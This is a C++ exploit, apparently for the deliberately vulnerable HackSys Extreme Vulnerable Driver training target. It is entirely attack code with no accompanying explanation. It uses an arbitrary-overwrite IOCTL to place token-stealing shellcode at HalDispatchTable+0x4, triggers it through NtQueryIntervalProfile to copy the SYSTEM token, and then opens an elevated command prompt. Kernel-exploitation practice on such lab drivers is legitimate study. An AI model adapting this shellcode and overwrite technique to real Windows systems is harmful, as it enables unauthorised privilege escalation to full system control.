#include <Windows.h>
#include <iostream>
#include <Psapi.h>
using namespace std;

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
}WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

typedef NTSTATUS (WINAPI* My_NtQueryIntervalProfile)(
	IN ULONG ProfileSource,
	OUT PULONG Interval);

char shellcode[] = (
	"\x60" // PUSHAD
	"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
	"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
	"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
	"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
							   // #---[Copy System PID token]
	"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
	"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
	"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
	"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
	"\x75\xED" // jnz                                          -> |
	"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
	"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
							   //#---[Recover]
	"\x61" // popad
	"\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
	"\xC3"
	);

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

LPVOID NtkrnlpaBase()
{
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 48);

		if (!strcmp((LPSTR)lpfileName, "ntkrnlpa.exe"))
		{
			printf("[+] success to get %s\n", lpfileName);
			return lpImageBase[i];
		}
	}
	return NULL;
}

DWORD32 GetHalOffset_4()
{
	// ntkrnlpa.exe in kernel space base address
	PVOID pNtkrnlpaBase = NtkrnlpaBase();

	printf("[+] ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);

	// ntkrnlpa.exe in user space base address
	HMODULE hUserSpaceBase = LoadLibrary("ntkrnlpa.exe");

	if (hUserSpaceBase == NULL)
	{
		printf("[+] Failed to get hUserSpaceBase !\n");
		system("pause");
		return 0;
	}

	// HalDispatchTable in user space address
	PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	if (pUserSpaceAddress == NULL)
	{
		printf("[+] Failed to get pUserSpaceAddress !\n");
		system("pause");
		return 0;
	}

	DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;

	printf("[+] HalDispatchTable+0x4 is 0x%p\n", hal_4);

	return (DWORD32)hal_4;
}

VOID trigger_vuln() {
	HANDLE hFile = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		cout << "[-] CreateFile Failed.\n";
		exit(-1);
	}

	cout << "[+] Opened handle to file with value " << hex << hFile << endl;
	cout << "[+] Creating WorkStation.\n";

	PWRITE_WHAT_WHERE Write_What_Where = (PWRITE_WHAT_WHERE)
		VirtualAlloc(NULL, sizeof(_WRITE_WHAT_WHERE), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Write_What_Where) {
		cout << "[-] VirtualAlloc Failed.\n";
		exit(-1);
	}

	cout << "[+] Allocated Memory at address " << hex << Write_What_Where << endl;

	Write_What_Where->What = (PULONG_PTR)& shellcode;
	Write_What_Where->Where = (PULONG_PTR)GetHalOffset_4();

	DWORD byteRet = 0x0;
	DWORD Interval = 0x0;
	DeviceIoControl(hFile, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, Write_What_Where, sizeof(Write_What_Where),
		NULL, 0, &byteRet, (LPOVERLAPPED)NULL);

	My_NtQueryIntervalProfile NtQueryIntervalProfile = (My_NtQueryIntervalProfile)
		GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryIntervalProfile");
	if (!NtQueryIntervalProfile) {
		cout << "[-] NtQueryIntervalProfile Failed.\n";
		exit(-1);
	}

	cout << "[+] Resolved NtQueryIntervalProfile at address " << hex << NtQueryIntervalProfile << endl;

	NtQueryIntervalProfile(0x1337, &Interval);
}

int main(void) {
	cout << "[+] HEVD Arbitrary Overwrite Exploit.\n";
	trigger_vuln();

	CreateCmd();

	return 0;
}